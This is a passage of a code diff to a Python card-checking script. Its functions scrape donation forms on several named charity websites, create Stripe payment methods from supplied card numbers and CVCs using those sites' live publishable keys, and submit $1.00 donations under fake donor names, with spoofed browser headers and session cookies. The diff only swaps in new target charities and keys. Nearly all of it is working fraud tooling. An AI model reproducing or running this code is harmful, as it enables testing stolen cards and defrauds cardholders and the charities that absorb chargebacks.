@@ -506,7 +506,7 @@ def go2(cc_input: str) -> str:
     'user-agent': user,
         }
         
-        response = requests.get('https://handsforcharity.ca/mississauga/', headers=headers)
+        response = requests.get('https://boilerhousespaces.com/donate-google-place-pantry/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -518,23 +518,23 @@ def go2(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhandsforcharity.ca&time_on_page=19233&client_attribution_metadata[client_session_id]=ba7529d6-35df-4b9d-9bf4-b5b33c2d6fa6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51KrzE2BwNF8aAhcXn8Y4IpKMhv8UVGt3xCtKCghxnfN5lTc3diGdP0hbgeLoSZZlaw19n9hKhwAjU9VuEjTNLVaN00LyWbV8ko'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=GB&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fboilerhousespaces.com&time_on_page=32928&client_attribution_metadata[client_session_id]=6c3618b7-b11c-4a72-9c9d-84bd51423c46&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -545,60 +545,57 @@ def go2(cc_input: str) -> str:
                 
         #3
         cookies = {
-    '__stripe_mid': '591dec15-1cbf-485e-9305-06cb6c9f8ad996786f',
-    'charitable_session': '572bb91f5c034222aba4977239d6d8e3||86400||82800',
-    '__stripe_sid': '84b30437-671b-4962-8ea7-ffc7a69dd6feacf664',
+            'cookieyes-consent': 'consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
+            'charitable_session': '8e6b4a1f23b55af6487d6d386fce14c6||86400||82800',
+            '__stripe_mid': '82c6a1e8-ca5c-4926-ab52-285bc5625904114010',
+            '__stripe_sid': '9afd8713-b367-43e0-9493-9dfbb6dc2d1818928f',
         }
+        
         headers = {
-    'authority': 'handsforcharity.ca',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://handsforcharity.ca',
-    'pragma': 'no-cache',
-    'referer': 'https://handsforcharity.ca/mississauga/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'boilerhousespaces.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'cookieyes-consent=consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; charitable_session=8e6b4a1f23b55af6487d6d386fce14c6||86400||82800; __stripe_mid=82c6a1e8-ca5c-4926-ab52-285bc5625904114010; __stripe_sid=9afd8713-b367-43e0-9493-9dfbb6dc2d1818928f',
+            'origin': 'https://boilerhousespaces.com',
+            'referer': 'https://boilerhousespaces.com/donate-google-place-pantry/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/mississauga/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'H4C Mississauga Fundraising',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'address': '24 George Street',
-    'address_2': '',
-    'city': 'Racie',
-    'state': 'New South Walet',
-    'postcode': '2000',
-    'country': 'AU',
-    'phone': '+61290123456',
-    'anonymous_donation': '1',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/donate-google-place-pantry/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'The Good Place Pantry',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'GB',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://handsforcharity.ca/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://boilerhousespaces.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)    
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -635,7 +632,7 @@ def go2(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51KrzE2BwNF8aAhcXn8Y4IpKMhv8UVGt3xCtKCghxnfN5lTc3diGdP0hbgeLoSZZlaw19n9hKhwAjU9VuEjTNLVaN00LyWbV8ko',
+    'key': 'pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -1088,7 +1085,7 @@ def go5(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://metazoonews.com/donate/', headers=headers)
+        response = requests.get('https://elgonfootballacademy.com/donate-now/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -1100,23 +1097,23 @@ def go5(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fmetazoonews.com&time_on_page=21111&client_attribution_metadata[client_session_id]=2e82e8d3-316c-4401-85c9-5aa774740bc3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SEyQFJHSyklWwJov5dWHnnLaivuSe8WFdfiZAVdC8aHcXu77yNSMSc1OheD2oh5yMmtsiR0c0K2rmSZOvF3HXsp00cZTnkoqN'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=UG&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Felgonfootballacademy.com&time_on_page=29834&client_attribution_metadata[client_session_id]=87337ba0-9aba-4527-bd5a-67095b5ada6f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Rfv1gLm8eUsGSvPEeWPI4YcgdmbSB7U6xa7j8aTrQ5zCPklYnFEpPSrrsD3aQE1pSheyjPJ7akiObJ5rhoUqQug00N0Ng736F'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -1127,55 +1124,56 @@ def go5(cc_input: str) -> str:
                 
         #3
         cookies = {
-    'charitable_session': 'ca914662176e18f3145971224172d32c||86400||82800',
-    'wpconsent_preferences': '{"essential":true,"statistics":false,"marketing":false}',
-    '_ga_DVNJBWYMZ4': 'GS2.1.s1765651388$o1$g0$t1765651388$j60$l0$h0',
-    '_ga': 'GA1.1.217029015.1765651389',
-    '__stripe_mid': '9cab4fa1-76dc-4a51-a6ff-264098308928ae18d1',
-    '__stripe_sid': '7a321c53-4187-44d3-96f2-030cf62b8ad521533c',
+            'charitable_session': 'd8598b7abc82b38d4aedc05226d6c85e||86400||82800',
+            '__stripe_mid': '67d31c52-da1f-4712-920c-ff0b369d516f6d8de2',
+            '__stripe_sid': '1c25e0c5-0938-4e62-b0e4-b35ee10a27ec290a35',
         }
+        
         headers = {
-    'authority': 'metazoonews.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://metazoonews.com',
-    'pragma': 'no-cache',
-    'referer': 'https://metazoonews.com/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'elgonfootballacademy.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=d8598b7abc82b38d4aedc05226d6c85e||86400||82800; __stripe_mid=67d31c52-da1f-4712-920c-ff0b369d516f6d8de2; __stripe_sid=1c25e0c5-0938-4e62-b0e4-b35ee10a27ec290a35',
+            'origin': 'https://elgonfootballacademy.com',
+            'referer': 'https://elgonfootballacademy.com/donate-now/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/donate/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'MetaZoo News December Monthly Server Fund',
-    'ID': f'{donation_id}',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'gateway': 'stripe',
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/donate-now/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Campaign',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'UG',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://metazoonews.com/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://elgonfootballacademy.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1212,7 +1210,7 @@ def go5(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51SEyQFJHSyklWwJov5dWHnnLaivuSe8WFdfiZAVdC8aHcXu77yNSMSc1OheD2oh5yMmtsiR0c0K2rmSZOvF3HXsp00cZTnkoqN',
+    'key': 'pk_live_51Rfv1gLm8eUsGSvPEeWPI4YcgdmbSB7U6xa7j8aTrQ5zCPklYnFEpPSrrsD3aQE1pSheyjPJ7akiObJ5rhoUqQug00N0Ng736F',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -1866,7 +1864,7 @@ def go9(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://hdsportsfoundation.org/campaigns/donate/', headers=headers)
+        response = requests.get('https://alexandrasangels.org/donate-now/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -1878,23 +1876,23 @@ def go9(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhdsportsfoundation.org&time_on_page=17915&client_attribution_metadata[client_session_id]=753c8b7f-a5b9-4144-a52a-3bebac4034a1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=27+Allen+St&billing_details[address][postal_code]=10002&billing_details[address][state]=New+York&billing_details[phone]=4303000850&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Falexandrasangels.org&time_on_page=43543&client_attribution_metadata[client_session_id]=51bf6c5c-296c-469b-ab72-91fa57e9a5d6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -1905,59 +1903,64 @@ def go9(cc_input: str) -> str:
                 
         #3
         cookies = {
-    '__stripe_mid': 'ed0951a7-c30f-4283-ae51-93acb8fc00be343415',
-    'charitable_session': '8950375b71d31a100fb6f172e73c4f75||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-18%2006%3A17%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
-    'sbjs_first_add': 'fd%3D2025-12-18%2006%3A17%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhdsportsfoundation.org%2Fcampaigns%2Fdonate%2F',
-    '__stripe_sid': '6a4680c0-004f-4f44-abab-c3a422a73a528a2e36',
+            '_ga_12WNKT9JXT': 'GS2.1.s1767343596$o1$g0$t1767343596$j60$l0$h0',
+            '_ga': 'GA1.1.628768292.1767343597',
+            'charitable_session': 'b6111f4739b8970ee3cf674a8d7f0682||86400||82800',
+            '_gauges_unique_hour': '1',
+            '_gauges_unique_day': '1',
+            '_gauges_unique_month': '1',
+            '_gauges_unique_year': '1',
+            '_gauges_unique': '1',
+            '__stripe_mid': 'ace11272-9b1b-44b9-a749-c1ac8d3343c9d4336f',
+            '__stripe_sid': 'ae734e13-b357-4e55-b200-82574fed8d0c18c7e2',
         }
+        
         headers = {
-    'authority': 'hdsportsfoundation.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://hdsportsfoundation.org',
-    'pragma': 'no-cache',
-    'referer': 'https://hdsportsfoundation.org/campaigns/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'alexandrasangels.org',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '_ga_12WNKT9JXT=GS2.1.s1767343596$o1$g0$t1767343596$j60$l0$h0; _ga=GA1.1.628768292.1767343597; charitable_session=b6111f4739b8970ee3cf674a8d7f0682||86400||82800; _gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; __stripe_mid=ace11272-9b1b-44b9-a749-c1ac8d3343c9d4336f; __stripe_sid=ae734e13-b357-4e55-b200-82574fed8d0c18c7e2',
+            'origin': 'https://alexandrasangels.org',
+            'referer': 'https://alexandrasangels.org/donate-now/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/campaigns/donate/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'Donate',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'donation_amount': 'custom',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/donate-now/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Help us Cure MS – Donate',
+            'ID': f'{donation_nonce}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '27 Allen St',
+            'address_2': '',
+            'city': 'New York',
+            'state': 'New York',
+            'postcode': '10002',
+            'country': 'US',
+            'phone': '4303000850',
+            'donor_comment': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://hdsportsfoundation.org/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://alexandrasangels.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1994,7 +1997,7 @@ def go9(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51NPpJdKIUe0GoHOrOLxrVcrMF6MA6k1XBhV1ZP1iTuHaF5oyatiiRzfipcqikkiJdPUcXpUVCvSlzvzOHDRdWHGX00JclvNuFr',
+    'key': 'pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2055,7 +2058,7 @@ def go10(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://apeacewithin.org/donation-page/', headers=headers)
+        response = requests.get('https://theartsft.com/campaigns/help-us-make-a-difference-right-now/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2067,23 +2070,23 @@ def go10(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
